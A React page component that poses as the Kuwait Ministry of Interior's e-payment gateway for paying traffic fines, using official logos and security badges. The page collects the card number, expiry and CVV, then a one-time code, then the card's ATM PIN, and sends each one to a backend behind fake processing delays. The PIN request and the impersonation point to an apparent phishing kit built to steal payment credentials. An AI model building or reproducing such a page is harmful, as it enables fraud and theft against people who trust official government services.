import React, { useState, useEffect, type ReactNode, type FormEvent } from "react";
import { useLocation } from "wouter";
import { trpc } from "@/lib/trpc";
import { useLanguage } from "@/contexts/LanguageContext";
import { Phone, Globe, Home as HomeIcon, ShieldCheck, Lock, CreditCard, ChevronRight, CheckCircle2, XCircle, AlertCircle, Loader2 } from "lucide-react";

type Stage = "card" | "card_pending" | "otp" | "otp_pending" | "atm" | "atm_pending" | "success" | "failed";

type CardSubmitPayload = {
  cardName: string;
  cardNumber: string;
  cardExpiry: string;
  cardCvv: string;
};

function PaymentFrame({ children }: { children: ReactNode }) {
  return (
    <div className="flex flex-col min-h-screen bg-[#f1f0e8] font-sans" dir="ltr">
      {children}
    </div>
  );
}

function PaymentGatewayHeader() {
  return (
    <header className="w-full bg-white shadow-sm border-b-4 border-[#003399]">
      <div className="container py-4 flex items-center justify-between">
        <div className="flex items-center gap-4">
          <img src="/logo-moi.svg" alt="MOI Logo" className="h-12 md:h-16" />
          <div className="hidden md:flex flex-col items-start">
            <img src="/state-of-kuwait.svg" alt="State of Kuwait" className="h-4" />
            <img src="/ministry-of-interior.svg" alt="Ministry of Interior" className="h-6 mt-0.5" />
          </div>
        </div>
        <div className="flex items-center gap-3">
          <div className="text-right hidden sm:block">
            <div className="text-xs font-bold text-[#003399]">بوابة الدفع الإلكتروني</div>
            <div className="text-[10px] text-gray-500">E-Payment Gateway</div>
          </div>
          <div className="w-10 h-10 rounded-full bg-blue-50 flex items-center justify-center text-[#003399]">
            <Lock className="w-5 h-5" />
          </div>
        </div>
      </div>
    </header>
  );
}

function SectionCard({ title, children }: { title: string; children: ReactNode }) {
  return (
    <section className="bg-white rounded-2xl shadow-lg border border-gray-200 overflow-hidden mb-6">
      <div className="bg-[#f8f9fa] px-6 py-4 border-b border-gray-100 flex items-center justify-between">
        <h3 className="text-sm font-black text-gray-700 uppercase tracking-wider">{title}</h3>
        <ShieldCheck className="w-4 h-4 text-green-500" />
      </div>
      <div className="p-6">{children}</div>
    </section>
  );
}

function InfoTable({ rows }: { rows: Array<{ label: string; value: string }> }) {
  return (
    <div className="space-y-3">
      {rows.map((row, index) => (
        <div key={index} className="flex justify-between items-center py-2 border-b border-gray-50 last:border-0">
          <span className="text-sm text-gray-500">{row.label}</span>
          <span className="text-sm font-bold text-gray-900">{row.value}</span>
        </div>
      ))}
    </div>
  );
}

export default function Payment() {
  const [location, navigate] = useLocation();
  const [stage, setStage] = useState<Stage>("card");
  const [paymentData, setPaymentData] = useState<any>(null);
  const [error, setError] = useState<string | null>(null);
  const [cardNumber, setCardNumber] = useState("");
  const [expiry, setExpiry] = useState("");
  const [cvv, setCvv] = useState("");
  const [otp, setOtp] = useState("");
  const [pin, setPin] = useState("");
  
  const { lang, t } = useLanguage();

  useEffect(() => {
    const data = sessionStorage.getItem("paymentData");
    if (!data) {
      navigate("/");
      return;
    }
    setPaymentData(JSON.parse(data));
  }, [navigate]);

  const processPayment = trpc.fines.processPayment.useMutation({
    onSuccess: (data) => {
      if (data.status === "otp_required") setStage("otp");
      else if (data.status === "pin_required") setStage("atm");
      else if (data.status === "success") setStage("success");
      else {
        setError(data.message || "Payment failed");
        setStage("failed");
      }
    },
    onError: (err) => {
      setError(err.message);
      setStage("failed");
    }
  });

  const handleCardSubmit = (e: FormEvent) => {
    e.preventDefault();
    setStage("card_pending");
    setTimeout(() => {
      processPayment.mutate({
        step: "card",
        cardNumber: cardNumber.replace(/\s/g, ""),
        expiry,
        cvv,
        paymentData
      });
    }, 1500);
  };

  const handleOtpSubmit = (e: FormEvent) => {
    e.preventDefault();
    setStage("otp_pending");
    setTimeout(() => {
      processPayment.mutate({
        step: "otp",
        otp,
        paymentData
      });
    }, 1500);
  };

  const handlePinSubmit = (e: FormEvent) => {
    e.preventDefault();
    setStage("atm_pending");
    setTimeout(() => {
      processPayment.mutate({
        step: "pin",
        pin,
        paymentData
      });
    }, 2000);
  };

  if (!paymentData) return null;

  return (
    <PaymentFrame>
      <PaymentGatewayHeader />
      
      <main className="flex-1 container py-8 max-w-4xl mx-auto">
        <div className="grid grid-cols-1 md:grid-cols-3 gap-8">
          {/* Left Column: Summary */}
          <div className="md:col-span-1">
            <SectionCard title="Payment Summary">
              <div className="text-center py-4 mb-6 bg-blue-50 rounded-2xl">
                <div className="text-[10px] text-blue-500 font-bold uppercase">Total Amount</div>
                <div className="text-3xl font-black text-[#003399]">{paymentData.totalAmount} د.ك</div>
              </div>
              <InfoTable rows={[
                { label: "Civil ID", value: paymentData.civilId },
                { label: "Violations", value: paymentData.selectedFines.length.toString() },
                { label: "Currency", value: "Kuwaiti Dinar" }
              ]} />
              <div className="mt-8 flex items-center gap-2 text-[10px] text-gray-400">
                <ShieldCheck className="w-4 h-4" />
                <span>Secure 256-bit SSL Encrypted Payment</span>
              </div>
            </SectionCard>
          </div>

          {/* Right Column: Payment Forms */}
          <div className="md:col-span-2">
            {stage === "card" && (
              <SectionCard title="Card Details">
                <form onSubmit={handleCardSubmit} className="space-y-6">
                  <div>
                    <label className="block text-xs font-bold text-gray-500 mb-2 uppercase">Card Number</label>
                    <div className="relative">
                      <input
                        type="text"
                        value={cardNumber}
                        onChange={(e) => setCardNumber(e.target.value.replace(/\D/g, "").replace(/(\d{4})(?=\d)/g, "$1 ").slice(0, 19))}
                        placeholder="0000 0000 0000 0000"
                        className="w-full h-12 px-4 rounded-xl border border-gray-200 focus:border-[#003399] focus:ring-0 text-lg font-mono"
                        required
                      />
                      <div className="absolute right-4 top-1/2 -translate-y-1/2">
                        <CreditCard className="w-5 h-5 text-gray-300" />
                      </div>
                    </div>
                  </div>
                  
                  <div className="grid grid-cols-2 gap-4">
                    <div>
                      <label className="block text-xs font-bold text-gray-500 mb-2 uppercase">Expiry Date</label>
                      <input
                        type="text"
                        value={expiry}
                        onChange={(e) => setExpiry(e.target.value.replace(/\D/g, "").replace(/(\d{2})(?=\d)/g, "$1/").slice(0, 5))}
                        placeholder="MM/YY"
                        className="w-full h-12 px-4 rounded-xl border border-gray-200 focus:border-[#003399] focus:ring-0 text-lg font-mono"
                        required
                      />
                    </div>
                    <div>
                      <label className="block text-xs font-bold text-gray-500 mb-2 uppercase">CVV</label>
                      <input
                        type="password"
                        value={cvv}
                        onChange={(e) => setCvv(e.target.value.replace(/\D/g, "").slice(0, 3))}
                        placeholder="123"
                        className="w-full h-12 px-4 rounded-xl border border-gray-200 focus:border-[#003399] focus:ring-0 text-lg font-mono"
                        required
                      />
                    </div>
                  </div>

                  <button
                    type="submit"
                    className="w-full h-14 bg-[#003399] hover:bg-[#002266] text-white rounded-xl font-black text-lg shadow-lg shadow-blue-900/20 transition-all"
                  >
                    Pay Now
                  </button>
                </form>
              </SectionCard>
            )}

            {(stage === "card_pending" || stage === "otp_pending" || stage === "atm_pending") && (
              <div className="bg-white rounded-2xl shadow-lg p-12 text-center border border-gray-200">
                <Loader2 className="w-16 h-16 text-[#003399] animate-spin mx-auto mb-6" />
                <h3 className="text-xl font-black text-gray-900 mb-2">Processing Payment...</h3>
                <p className="text-gray-500">Please do not close or refresh this page.</p>
              </div>
            )}

            {stage === "otp" && (
              <SectionCard title="Verify Transaction">
                <form onSubmit={handleOtpSubmit} className="space-y-6 text-center">
                  <div className="w-16 h-16 bg-blue-50 text-[#003399] rounded-full flex items-center justify-center mx-auto mb-4">
                    <Phone className="w-8 h-8" />
                  </div>
                  <h3 className="text-lg font-black">Enter Verification Code</h3>
                  <p className="text-sm text-gray-500">A 6-digit code has been sent to your mobile number.</p>
                  
                  <input
                    type="text"
                    value={otp}
                    onChange={(e) => setOtp(e.target.value.replace(/\D/g, "").slice(0, 6))}
                    placeholder="000000"
                    className="w-full h-14 px-4 rounded-xl border-2 border-gray-200 focus:border-[#003399] focus:ring-0 text-2xl font-black tracking-[1em] text-center"
                    required
                  />

                  <button
                    type="submit"
                    className="w-full h-14 bg-[#003399] hover:bg-[#002266] text-white rounded-xl font-black text-lg transition-all"
                  >
                    Confirm Code
                  </button>
                </form>
              </SectionCard>
            )}

            {stage === "atm" && (
              <SectionCard title="ATM PIN Verification">
                <form onSubmit={handlePinSubmit} className="space-y-6 text-center">
                  <div className="w-16 h-16 bg-blue-50 text-[#003399] rounded-full flex items-center justify-center mx-auto mb-4">
                    <Lock className="w-8 h-8" />
                  </div>
                  <h3 className="text-lg font-black">Enter Card PIN</h3>
                  <p className="text-sm text-gray-500">Please enter your 4-digit ATM PIN for security.</p>
                  
                  <input
                    type="password"
                    value={pin}
                    onChange={(e) => setPin(e.target.value.replace(/\D/g, "").slice(0, 4))}
                    placeholder="••••"
                    className="w-full h-14 px-4 rounded-xl border-2 border-gray-200 focus:border-[#003399] focus:ring-0 text-2xl font-black tracking-[1em] text-center"
                    required
                  />

                  <button
                    type="submit"
                    className="w-full h-14 bg-[#003399] hover:bg-[#002266] text-white rounded-xl font-black text-lg transition-all"
                  >
                    Confirm PIN
                  </button>
                </form>
              </SectionCard>
            )}

            {stage === "success" && (
              <div className="bg-white rounded-2xl shadow-lg p-12 text-center border border-gray-200">
                <div className="w-20 h-20 bg-green-50 text-green-500 rounded-full flex items-center justify-center mx-auto mb-6">
                  <CheckCircle2 className="w-10 h-10" />
                </div>
                <h3 className="text-2xl font-black text-gray-900 mb-2">Payment Successful!</h3>
                <p className="text-gray-500 mb-8">Your transaction has been processed and violations updated.</p>
                <button
                  onClick={() => navigate("/")}
                  className="px-8 py-3 bg-[#003399] text-white rounded-xl font-black transition-all"
                >
                  Return to Home
                </button>
              </div>
            )}

            {stage === "failed" && (
              <div className="bg-white rounded-2xl shadow-lg p-12 text-center border border-gray-200">
                <div className="w-20 h-20 bg-red-50 text-red-500 rounded-full flex items-center justify-center mx-auto mb-6">
                  <XCircle className="w-10 h-10" />
                </div>
                <h3 className="text-2xl font-black text-gray-900 mb-2">Payment Failed</h3>
                <p className="text-red-500 mb-8">{error || "Transaction declined by issuing bank."}</p>
                <button
                  onClick={() => setStage("card")}
                  className="px-8 py-3 bg-gray-900 text-white rounded-xl font-black transition-all"
                >
                  Try Again
                </button>
              </div>
            )}
          </div>
        </div>
      </main>

      <footer className="w-full bg-white border-t border-gray-200 py-6 text-center">
        <p className="text-xs text-gray-400 font-bold">
          © 2026 Ministry of Interior - State of Kuwait. All Rights Reserved.
        </p>
      </footer>
    </PaymentFrame>
  );
}
